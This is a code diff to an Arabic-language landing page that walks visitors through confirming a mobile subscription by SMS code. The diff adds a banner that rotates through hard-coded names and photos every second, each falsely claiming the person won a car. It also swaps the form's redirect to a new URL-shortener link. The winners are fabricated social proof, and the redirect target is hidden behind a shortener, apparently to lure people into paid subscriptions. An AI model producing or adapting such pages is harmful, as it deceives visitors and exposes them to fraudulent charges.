@@ -22,47 +22,63 @@
         .country .item {margin:10px 0;border-radius:40px;border:2px solid #000;display:flex;align-items:center;padding:5px;background-color: #fff; cursor: pointer;}
         .country .item:hover {background-color: #eceaea;}
         .country .item img {width:50px;height:50px;border-radius:50%;}
-        .country .item .name {width:100%;}
         .copy {margin:50px 0;color:#666;font-size:.8rem;}
         .mbc {width:60px;margin-top:5px;}
         .location {color:#666;}
         .container-ls {max-width: 500px;margin: 15px auto;}
 
-        /* Modal styles */
-        .modal-backdrop.show {
-            opacity: 0.5;
+        /* تصميم شريط الفائز الجانبي */
+        #winner-banner {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background-color: #FF6F61;
+            color: white;
+            padding: 8px;
+            width: 220px;
+            height: 60px;
+            font-size: 0.9em;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+        }
+        #winner-banner img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
         }
     </style>
 </head>
 <body>
+
+    <!-- شريط عرض الفائزين الجانبي -->
+    <div id="winner-banner">
+        <img id="winner-image" src="" alt="صورة الفائز">
+        <div id="winner-message">🎉 لقد فاز <span id="winner-name"></span> بسيارة!</div>
+    </div>
+
     <script type="text/javascript">
-        function setAttributeOnload(object, attribute, val) {
-            if(window.addEventListener) {
-                window.addEventListener('load',
-                    function(){ object[attribute] = val; }, false);
-            } else {
-                window.attachEvent('onload', function(){ object[attribute] = val; });
-            }
+        // قائمة بأسماء وصور الفائزين
+        const winners = [
+            { name: "محمد", image: "https://h.top4top.io/p_32205kc2b1.png" },
+            { name: "علي", image: "https://i.top4top.io/p_3220w2nxu1.jpg" },
+            { name: "سارة", image: "https://h.top4top.io/p_32205kc2b1.png" },
+            { name: "فاطمة", image: "https://b.top4top.io/p_3220s1bix1.jpg" }
+            // أضف المزيد من الفائزين هنا
+        ];
+
+        let index = 0;
+
+        function updateWinner() {
+            document.getElementById("winner-name").textContent = winners[index].name;
+            document.getElementById("winner-image").src = winners[index].image;
+            index = (index + 1) % winners.length;
         }
 
-        function openModal(country) {
-            document.getElementById("country-name").innerText = country;
-            var modal = new bootstrap.Modal(document.getElementById('subscriptionModal'));
-            modal.show();
-        }
-    </script>
-    
-    <script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
-    <script type="text/javascript">
-        gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
-            if (gapi.iframes && gapi.iframes.getContext) {
-                gapi.iframes.getContext().openChild({
-                    url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d5094481257847135757\x26blogName\x3dtes\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dBLUE\x26layoutType\x3dCLASSIC\x26searchRoot\x3dhttps://hhh7hjk.blogspot.com/search\x26blogLocale\x3dar\x26v\x3d2\x26homepageUrl\x3dhttps://hhh7hjk.blogspot.com/?m%3D0\x26vt\x3d5087231601720675360',
-                    where: document.getElementById("navbar-iframe-container"),
-                    id: "navbar-iframe"
-                });
-            }
-        });
+        setInterval(updateWinner, 1000);
     </script>
 
     <div class="container container-ls">
@@ -113,6 +129,7 @@
                         <li>رح يوصلك رمز الاشتراك في SMS.</li>
                         <li>حط الرمز واضغط على تأكيد.</li>
                     </ol>
+                  
 <div>
     <br>
     <div class="country">
@@ -201,7 +218,7 @@ document.getElementById('name').addEventListener('input', function() {
 // منع إرسال النموذج لإظهار الرسالة فقط
 document.getElementById('subscriptionForm').onsubmit = function(e) {
     e.preventDefault();
-    window.location.href = 'https://smrturl.co/009f857'; // تحويل إلى الرابط المطلوب
+    window.location.href = 'https://rb.gy/orrsha'; // تحويل إلى الرابط المطلوب
 }
 </script>
 
